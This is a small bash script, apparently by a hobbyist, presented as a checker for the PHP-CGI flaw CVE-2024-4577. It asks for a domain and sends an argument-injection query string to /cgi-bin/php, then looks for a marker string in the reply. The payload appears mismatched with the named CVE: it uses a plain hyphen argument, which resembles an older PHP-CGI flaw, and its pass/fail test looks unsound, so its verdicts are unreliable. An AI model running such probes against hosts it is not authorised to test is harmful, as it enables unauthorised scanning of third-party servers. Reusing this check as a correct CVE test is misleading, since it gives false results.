#!/bin/bash
# c0ded by it T4mpan
# Function to check vulnerability
clear
echo " ---------------------------------"
echo "    cve 2024 4577 php cgi checker"
echo "----------------------------------"
echo ""
check_vulnerability() {
    local domain=$1
    local payload="?-s&echo%20CVE-2024-4577-Vulnerable"

    # Send a request to the PHP CGI endpoint
    response=$(curl -s "${domain}/cgi-bin/php${payload}")

    # Check if the response contains the unique string indicating vulnerability
    if [[ "$response" == *"CVE-2024-4577-Vulnerable"* ]]; then
        echo "[+] Vulnerable: ${domain}"
    else
        echo "[-] Not Vulnerable: ${domain}"
    fi
}

# Main script starts here
read -p "Enter the domain (e.g., http://example.com): " domain

# Check if the domain is provided
if [[ -z "$domain" ]]; then
    echo "No domain provided. Exiting."
    exit 1
fi

# Call the function to check vulnerability
check_vulnerability "$domain"

